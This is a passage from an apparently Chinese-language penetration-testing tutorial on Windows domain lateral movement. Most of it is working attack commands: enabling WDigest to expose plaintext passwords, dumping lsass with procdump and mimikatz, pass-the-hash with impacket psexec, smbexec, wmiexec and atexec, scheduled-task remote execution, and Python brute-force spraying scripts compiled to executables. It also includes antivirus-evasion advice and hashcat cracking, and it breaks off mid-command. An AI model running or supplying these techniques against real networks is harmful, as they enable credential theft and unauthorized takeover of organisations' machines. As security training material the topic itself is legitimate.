title="2.5.3探针域内主机角色及服务信息"></a>2.5.3探针域内主机角色及服务信息</h3><ul><li>利用开放端口服务及计算机名判断</li><li>核心业务机器：<ul><li>1.高级管理人员，系统管理员，财务/人事、业务人员的个人计算机</li><li>2.产品管理系统服务器</li><li>3.办公系统服务器</li><li>4.财务应用系统服务器</li><li>5.核心产品源码服务器</li><li>6.数据库服务器</li><li>7.文件或者网盘服务器</li><li>8.电子邮件服务器</li><li>9.网络监控系统服务器</li><li>10.其他服务器（内部技术文档服务器，其他监控服务器）</li></ul></li></ul><h1 id="3-横向渗透"><a href="#3-横向渗透" class="headerlink" title="3.横向渗透"></a>3.横向渗透</h1><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637082735775-4c5e7c9f-5664-4d7d-be78-562243c10e7c.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">知识点1：</span><br><span class="line">Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码</span><br><span class="line">Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</span><br><span class="line"> </span><br><span class="line">针对以上情况，我们提供了4种方式解决此类问题</span><br><span class="line">    1.利用哈希hash传递(pth，ptk等)进行移动</span><br><span class="line">    2.利用其它服务协议(SMB,WMI等)进行哈希移动</span><br><span class="line">    3.利用注册表操作开启Wdigest Auth值进行获取</span><br><span class="line">    4.利用工具或第三方平台(Hachcat)进行破解获取</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash">注册表操作开启Wdigest Auth值</span></span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"> </span><br><span class="line">知识点2：</span><br><span class="line">Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，</span><br><span class="line">服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash">获取win密码<span class="built_in">hash</span>的两个工具</span></span><br><span class="line">Pwdump7</span><br><span class="line">QuarksPwdump</span><br><span class="line"> </span><br><span class="line">知识点3：</span><br><span class="line">域用户与本地用户的区别</span><br><span class="line">比如，god/administrator是域用户，./administrator是本地用户</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637112584054-01c3ed08-d677-40ba-a6d7-854d1cf1c29b.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">知识点：</span><br><span class="line"></span><br><span class="line">PTH （pass the hash） 利用lm或者ntlm的值进行的渗透测试</span><br><span class="line">PTT （pass the ticket） 利用的票据凭证TGT进行的渗透测试</span><br><span class="line">PTK （pass the key） 利用的ekeys aes256进行的渗透测试</span><br><span class="line">PTH在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash远程访问主机或者服务，而不提供明文密码。</span><br><span class="line"></span><br><span class="line">如果禁用了ntlm认证，PsExec工具无法利用获得的ntlm hash进行远程连接，但是使用mimikatz工具还是可以攻击成功。</span><br><span class="line"></span><br><span class="line">对于8.1/2012r2，安装补丁kb2871997的Win 7/2008r2/8/2012等，可以使用AES keys代替NT hash来实现ptk攻击。</span><br><span class="line"></span><br><span class="line">总结：KB2871997补丁后的影响</span><br><span class="line"></span><br><span class="line">pth：没打补丁用户都可以连接，打了补丁只能administrator连接</span><br><span class="line">ptk：打了补丁才能用户都可以连接，采用aes256连接</span><br><span class="line">https://www.freebuf.com/column/220740.html</span><br><span class="line">PTT攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：MS14-068，Golden ticket，SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。</span><br><span class="line"></span><br><span class="line">MS14-068基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)</span><br><span class="line"></span><br><span class="line">其中Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术（不属于本课内容，以后会讲）</span><br><span class="line"></span><br><span class="line">MS14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。</span><br><span class="line"></span><br><span class="line">补充-Kerberos协议具体工作方法，在域中，简要介绍一下：</span><br><span class="line"></span><br><span class="line">客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</span><br><span class="line">将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line">然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</span><br><span class="line">检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</span><br></pre></td></tr></table></figure><h2 id="3-1横向渗透明文密码传递（at-schtasks）"><a href="#3-1横向渗透明文密码传递（at-schtasks）" class="headerlink" title="3.1横向渗透明文密码传递（at|schtasks）"></a>3.1横向渗透明文密码传递（at|schtasks）</h2><p>在拿下一台内网主机，通过本地信息搜集收集用户凭据等信息后，如何横向渗透拿下更多的主机？这里仅介绍at&amp;schtasks命令的使用，在已知目标系统的用户明文密码的基础上，直接可在远程主机上执行命令。<br>获取到某域主机权限-&gt; minikatz得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做字典-&gt;尝试连接-&gt;创建计划任务（at|schtasks）-&gt;执行文件可为后门或者相关命令。<br>IPC（ Internet Process Connection）是共享“命名管道”的资管，它是为了让进城间通信而开放的命名管道，可以通过验证用户名和密码获得相关的权限，在远程管路计算机和查看计算机的共享资源时使用。</p><p>利用流程：<br>建立IPC链接到目标主机<br>-&gt;拷贝要执行的命令脚本到目标主机<br>-&gt;查看目标时间，创建计划任务（ at,schtasks ）定时执行拷贝到的脚本<br>-&gt;删除IPC链接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 工作组</span></span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:username </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">域内</span></span><br><span class="line">net use \\server\ipc$&quot;password&quot; /user:domain\username </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看文件列表</span></span><br><span class="line">dir \\xx.xx.xx.xx\C$\                </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载文件</span></span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制文件</span></span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除文件</span></span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 删除IPC</span></span><br><span class="line">net use \\xx.xx.xx.xx\ipc$ \del     </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看对方共享</span></span><br><span class="line">net view xx.xx.xx.xx                </span><br></pre></td></tr></table></figure><p>建立IPC常见的错误代码</p><ul><li>(1) 5：拒绝访问，可能是使用的不是管理员权限，需要先提升权限</li><li>(2) 51：网络问题，windoows无法找到网络路径</li><li>(3) 53：找不到网站路径，可能是IP地址错误，目标未开机，目标Lanmanserver服务未启动、有防火墙等问题</li><li>(4) 67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$</li><li>(5) 1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除</li><li>(6) 1326：账号密码错误</li><li>(7) 1792：目标NetLogon服务未启动，连接域控常常会出现此情况</li><li>(8) 2242：用户密码过期，目标有账号策略，强制定期更改密码</li></ul><p>建立IPC失败的原因</p><ul><li>(1) 目标系统不是NT或以上的操作系统</li><li>(2) 对方没有打开IPC$共享</li><li>(3) 对方未开启139,445端口，或者被防火墙屏蔽</li><li>(4) 输出命令，账号密码有错误</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">at &lt; Windows2012<span class="comment"># 建立ipc连接net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 拷贝执行文件到目标机器copy add.bat \192.168.3.21\c$  # 添加计划任务at \\192.168.3.21 15:47 c:\add.bat     schtasks &gt;=Windows2012# 建立ipc连接net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\administrator # 复制文件到其C盘copy add.bat \\192.168.3.32\c$ # 创建adduser任务对应执行文件schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F # 运行adduser任务schtasks /run /s 192.168.3.32 /tn adduser /i# 删除adduser任务schtasks /delete /s 192.168.3.21 /tn adduser /f</span></span></span><br></pre></td></tr></table></figure><h2 id="3-2横向渗透明文HASH传递（atexec-impacket）"><a href="#3-2横向渗透明文HASH传递（atexec-impacket）" class="headerlink" title="3.2横向渗透明文HASH传递（atexec-impacket）"></a>3.2横向渗透明文HASH传递（atexec-impacket）</h2><p>atexec</p><ul><li>优点：一句话命令，连接、提权全部搞定。</li><li>缺点：第三方工具，非微软官方工具，易被杀毒软件查杀，实战中需要自己做一下免杀。</li><li>atexec是Impacket网络协议工具包中的一个工具。Impacket工具包介绍：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> impacket工具包下载，可下载exe版本https://gitee.com/RichChigga/impacket-examples-windows<span class="comment"># 工作组atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;# 域内atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;# 明文HASHatexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span></span></span><br></pre></td></tr></table></figure><h2 id="3-3横向渗透明文HASH传递批量利用-综合"><a href="#3-3横向渗透明文HASH传递批量利用-综合" class="headerlink" title="3.3横向渗透明文HASH传递批量利用-综合"></a>3.3横向渗透明文HASH传递批量利用-综合</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 批量检测IP对应明文连接FOR /F %%i <span class="keyword">in</span> (ips.txt) <span class="keyword">do</span> net use \%%i\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administrator <span class="comment"># 批量检测IP对应明文回显版FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami # 批量检测明文对应IP回显版FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami # 批量检测HASH对应IP回显版FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami</span></span> </span><br></pre></td></tr></table></figure><h2 id="3-4横向渗透明文HASH传递批量利用-升级版"><a href="#3-4横向渗透明文HASH传递批量利用-升级版" class="headerlink" title="3.4横向渗透明文HASH传递批量利用-升级版"></a>3.4横向渗透明文HASH传递批量利用-升级版</h2><p>上述批处理命令只能遍历一个变量（不知道可不可遍历2个变量，反正我不会写），如果想要遍历多个变量，比如IP、用户名、密码等，可以写python脚本，免杀，使用Pyinstaller打包成exe文件，上传到目标机器运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,timeips=&#123;   <span class="string">&#x27;192.168.3.21&#x27;</span>,   <span class="string">&#x27;192.168.3.25&#x27;</span>,   <span class="string">&#x27;192.168.3.29&#x27;</span>,   <span class="string">&#x27;192.168.3.30&#x27;</span>,   <span class="string">&#x27;192.168.3.31&#x27;</span>,   <span class="string">&#x27;192.168.3.33&#x27;</span>&#125; users=&#123;   <span class="string">&#x27;Administrator&#x27;</span>,   <span class="string">&#x27;boss&#x27;</span>,   <span class="string">&#x27;dbadmin&#x27;</span>,   <span class="string">&#x27;fileadmin&#x27;</span>,   <span class="string">&#x27;mack&#x27;</span>,   <span class="string">&#x27;mary&#x27;</span>,   <span class="string">&#x27;vpnadm&#x27;</span>,   <span class="string">&#x27;webadmin&#x27;</span>&#125;passs=&#123;   <span class="string">&#x27;admin&#x27;</span>,   <span class="string">&#x27;admin!@#45&#x27;</span>,   <span class="string">&#x27;Admin12345&#x27;</span>&#125; <span class="keyword">for</span> ip <span class="keyword">in</span> ips:   <span class="keyword">for</span> user <span class="keyword">in</span> users:       <span class="keyword">for</span> mima <span class="keyword">in</span> passs:           <span class="built_in">exec</span>=<span class="string">&quot;net use \&quot;+ &quot;</span>\<span class="string">&quot;+ip+&#x27;\ipc$ &#x27;+mima+&#x27; /user:god\&#x27;+user           print(&#x27;---&gt;&#x27;+exec+&#x27;&lt;---&#x27;)           os.system(exec)           time.sleep(1)</span></span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装pyinstallerpip install pyinstaller<span class="comment"># 生成可执行EXEpyinstaller -F fuck_neiwang_001.py</span></span> </span><br></pre></td></tr></table></figure><h2 id="3-5横向渗透Procdump-Mimikatz配合获取"><a href="#3-5横向渗透Procdump-Mimikatz配合获取" class="headerlink" title="3.5横向渗透Procdump+Mimikatz配合获取"></a>3.5横向渗透Procdump+Mimikatz配合获取</h2><p>Mimikatz属于第三方软件，直接上传到目标主机可能被杀毒软件查杀，这时我们可以配合<strong>官方软件Procdump</strong>，将Procdump上传目标主机获取用户信息(该文件不可读)，使用本地的Mimikatz打开Procdump获取的用户信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump<span class="comment"># mimikatz下载：https://github.com/gentilkiwi/mimikatz/releases# procdump 在目标机上执行procdump -accepteula -ma lsass.exe lsass.dmp # mimikatz 在本地执行：sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</span></span></span><br></pre></td></tr></table></figure><h2 id="3-6Hashcat破解获取Windows-NTML-Hash"><a href="#3-6Hashcat破解获取Windows-NTML-Hash" class="headerlink" title="3.6Hashcat破解获取Windows NTML Hash"></a>3.6Hashcat破解获取Windows NTML Hash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Hashcat下载：https://github.com/hashcat/hashcat<span class="comment"># 密码破解全能工具-Hashcat密码破解攻略：https://www.freebuf.com/sectool/164507.html# 爆破命令hashcat -a 0 -m 1000 hash file --force</span></span> </span><br></pre></td></tr></table></figure><h2 id="3-7域横向移动SMB服务利用-psexec-smbexec"><a href="#3-7域横向移动SMB服务利用-psexec-smbexec" class="headerlink" title="3.7域横向移动SMB服务利用-psexec,smbexec"></a>3.7域横向移动SMB服务利用-psexec,smbexec</h2><p>利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。<br>psexec工具：</p><ul><li>在微软官方Pstools工具包中，但是官方Pstools中的psexec只能明文连接，无法采用hash连接。</li><li>如果需要hash连接，可以使用impacket工具包中的psexec，但是impacket非官方自带，容易被杀。</li><li>Pstools官方工具包：<ul><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pstools">https://docs.microsoft.com/en-us/sysinternals/downloads/pstools</a></li></ul></li><li>impacket工具包：<ul><li><a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></li><li><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> psexec第一种：先有ipc链接，psexec需要明文或<span class="built_in">hash</span>传递net use \\192.168.3.32\ipc$ <span class="string">&quot;admin!@#45&quot;</span> /user:administratorpsexec \\192.168.3.32 -s cmd <span class="comment"># 需要先有ipc链接 -s以System权限运行 # psexec第二种：不用建立IPC直接提供明文账户密码（推荐）psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmdpsexec -hashes :$HASH$ ./administrator@10.1.2.3psexec -hashes :$HASH$ domain/administrator@10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 # smbexec工具：#非官方自带-参考impacket工具包使用，操作简单，容易被杀#smbexec无需先ipc链接 明文或hash传递smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span></span></span><br></pre></td></tr></table></figure><h2 id="3-8域横向移动WMI服务利用-cscript-wmiexec-wmic"><a href="#3-8域横向移动WMI服务利用-cscript-wmiexec-wmic" class="headerlink" title="3.8域横向移动WMI服务利用-cscript,wmiexec,wmic"></a>3.8域横向移动WMI服务利用-cscript,wmiexec,wmic</h2><p>WMI(Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法<strong>不会在目标日志系统留下痕迹</strong>。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">自带WMIC 明文传递 优点是自带工具，不用考虑免杀，缺点是无回显</span></span><br><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自带cscript明文传递 有回显 需要借助 wmiexec.vbs脚本</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> wmiexec.vbs脚本下载：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://www.secpulse.com/wp-content/uploads/2015/05/cache-a360611dc24d240989799c29c555e4b7_wmiexec-v1_1.rar</span></span><br><span class="line">cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 套件impacket wmiexec 明文或<span class="built_in">hash</span>传递 有回显exe版本 易被杀</span></span><br><span class="line">wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;</span><br><span class="line">wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h2 id="3-9域横向移动以上服务hash批量利用-python编译exe（以上汇总）"><a href="#3-9域横向移动以上服务hash批量利用-python编译exe（以上汇总）" class="headerlink" title="3.9域横向移动以上服务hash批量利用-python编译exe（以上汇总）"></a>3.9域横向移动以上服务hash批量利用-python编译exe（以上汇总）</h2><h3 id="3-9-1mimikatz收集到密码hash（假设没收集到明文）"><a href="#3-9-1mimikatz收集到密码hash（假设没收集到明文）" class="headerlink" title="3.9.1mimikatz收集到密码hash（假设没收集到明文）"></a>3.9.1mimikatz收集到密码hash（假设没收集到明文）</h3><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637083552922-94300907-83eb-4895-a1c6-7d2ccd50b74a.png" alt="image.png"></p><h3 id="3-9-2探测同网段存活主机"><a href="#3-9-2探测同网段存活主机" class="headerlink" title="3.9.2探测同网段存活主机"></a>3.9.2探测同网段存活主机</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 自带内部命令（推荐使用）</span></span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL =&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637083677266-784614c1-0a55-472a-89a0-74279fd6c7ae.png" alt="image.png"></p><h3 id="3-9-3收集域用户名信息"><a href="#3-9-3收集域用户名信息" class="headerlink" title="3.9.3收集域用户名信息"></a>3.9.3收集域用户名信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取当前域里面的用户</span></span><br><span class="line">net user /domain </span><br></pre></td></tr></table></figure><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637083677266-784614c1-0a55-472a-89a0-74279fd6c7ae-164600282995822.png" alt="image.png"></p><h3 id="3-9-4将收集到的IP，用户名，密码hash通过脚本批量利用"><a href="#3-9-4将收集到的IP，用户名，密码hash通过脚本批量利用" class="headerlink" title="3.9.4将收集到的IP，用户名，密码hash通过脚本批量利用"></a>3.9.4将收集到的IP，用户名，密码hash通过脚本批量利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line"> </span><br><span class="line">ips=&#123;</span><br><span class="line"><span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">users=&#123;</span><br><span class="line"><span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">hashs=&#123;</span><br><span class="line"><span class="comment">#&#x27;ccef208c6485269c20db2cad21734fe7&#x27;,</span></span><br><span class="line"><span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line">            <span class="comment">#域用户和本地用户都试试</span></span><br><span class="line">            <span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line">            <span class="comment">#wmiexec -hashes :hash ./user@ip whoami</span></span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; ./&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">            os.system(<span class="built_in">exec</span>)</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编译成exe文件pyinstaller.exe -F fuck_neiwang_001.py</span></span><br></pre></td></tr></table></figure><p>执行exe文件，拿下192.168.3.29主机<br>在192.168.3.29主机运行minikatz，获取到一个新的密码hash（假设只找到了hash）<br>将新的hash加入到python脚本中，重新编译打包，执行exe文件，就有可能渗透到别的主机，甚至域控。</p><h2 id="3-10域横向移动PTH传递-mimikatz"><a href="#3-10域横向移动PTH传递-mimikatz" class="headerlink" title="3.10域横向移动PTH传递-mimikatz"></a>3.10域横向移动PTH传递-mimikatz</h2><p>注：<br>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。由于目前大部分主机系统都很新，所以一般我们收集的都是NTLM数据，但是也不排除内网中有老系统，所以在信息收集的时候，最好LM和NTLM都收集一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTH ntlm传递 - 未打补丁下的工作组及域连接： sekurlsa::logonPasswords    获取NTLM值 sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7        连接域用户sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c      连接本地用户sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 注意区分本地用户与域用户，在实战中都尝试连接一下dir \\OWA2010CN-God.god.org\c$dir \\192.168.3.21\c$</span><br></pre></td></tr></table></figure><h2 id="3-11域横向移动PTK传递-mimikatz"><a href="#3-11域横向移动PTK传递-mimikatz" class="headerlink" title="3.11域横向移动PTK传递-mimikatz"></a>3.11域横向移动PTK传递-mimikatz</h2><p>注：<br>在实际上，PTK传递比PTH传递用的少，因为PTK传递需要一个前提条件，主机必须打了补丁kb2871997。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTK aes256传递 - 打补丁后的工作组及域连接：# 获取aes256值 sekurlsa::ekeys sekurlsa::pth /user:mary /domain:god 